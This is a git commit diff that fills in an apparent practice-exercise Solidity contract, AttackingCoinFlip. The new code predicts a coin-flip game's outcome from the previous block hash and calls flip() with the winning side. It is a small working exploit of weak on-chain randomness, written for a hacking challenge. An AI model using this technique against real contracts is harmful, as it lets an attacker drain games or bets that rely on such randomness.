d976aeb4a53fdb2d358b799619daec9e160f76a4
pycckuu <is.markelov@gmail.com>
2022-08-07 18:45:37 +0200

    hack: 1. CoinFlip hack

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -2,7 +2,9 @@
 pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
 
-contract AttackingCoinFlip {
+import "hardhat/console.sol";
+
+contract AttackingCoinFlip is CoinFlip {
     address public contractAddress;
 
     constructor(address _contractAddress) {
@@ -10,6 +12,10 @@ contract AttackingCoinFlip {
     }
 
     function hackContract() external {
-        // Code me!
+        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / factor;
+        bool side = coinFlip == 1 ? true : false;
+        CoinFlip(contractAddress).flip(side);
     }
 }
